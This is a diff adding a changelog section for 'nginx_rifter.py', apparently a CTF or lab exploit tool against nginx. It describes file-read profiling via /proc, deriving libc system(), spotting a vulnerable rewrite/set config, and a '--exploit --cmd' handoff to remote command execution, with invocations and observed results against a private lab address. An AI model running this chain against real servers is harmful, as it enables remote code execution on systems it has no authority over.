@@ -534,3 +534,48 @@ Last updated: 2026-05-15 05:32:17 CEST
   - stage `[04]` is now `Remote command verification setup`,
   - first winning address `0x55e4210b2127`, body offset `1376`,
   - artifact: `artifacts/demo_v1_9_20260515-060834.json`.
+
+### v2 Assessment-First Rifter
+
+- Added `nginx_rifter.py` as the v2 entry point for real-world-oriented assessment.
+- Default mode is non-exploitative:
+  - HTTP and cleartext HTTP/2 probing,
+  - modular HTTP file-read profiling,
+  - small text, binary, ranged-read, `/proc/self/status`, and `/proc/self/maps` checks,
+  - nginx worker discovery through pid files and `/proc`,
+  - remote libc `system()` derivation,
+  - nginx/libc SHA-256 and ELF build-ID fingerprinting,
+  - nginx config discovery from master cmdline plus common paths,
+  - vulnerable `rewrite` + `set` route candidate detection,
+  - exploit-chain viability matrix.
+- `--exploit --cmd ...` is explicit and hands off to the tested `demo_ctf_exploit_v1_9.py` path after assessment.
+- Validated default assessment:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 --artifact-dir artifacts --no-color --output artifacts/nginx_rifter_20260515-v2-final.json
+```
+
+- Observed:
+  - HTTP `200`, server `nginx/1.31.0`, HTTP/2 cleartext available,
+  - file-read primitive supports small text, binary, ranged reads, `/proc/self/status`, and `/proc/self/maps`,
+  - nginx worker maps readable, libc base and `system()` derived,
+  - nginx build ID `060e053ab1fa1a2876b7fe0ff4eff0cc777857b6`,
+  - libc build ID `095c7ba148aeca81668091f718047078d57efddb`,
+  - config discovery found `/app/nginx-lfi.conf`,
+  - vulnerable candidate: `location ~ ^/api/(.*)$`, `rewrite ^/api/(.*)$ /internal?migrated=true`, `set $original_endpoint PPPPPPPPPPP$1`,
+  - verdict `ready-with-lab-like-core-leak`.
+- Validated template-backed assessment:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
+  --artifact-dir artifacts --no-color --output artifacts/nginx_rifter_20260515-v2-template.json
+```
+
+- Validated explicit exploit handoff:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 --artifact-dir artifacts --no-color --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
+```
+
+- Observed handoff artifact: `artifacts/nginx_rifter_20260515-063534.json`; exploit artifact: `artifacts/demo_v1_9_20260515-063534.json`.
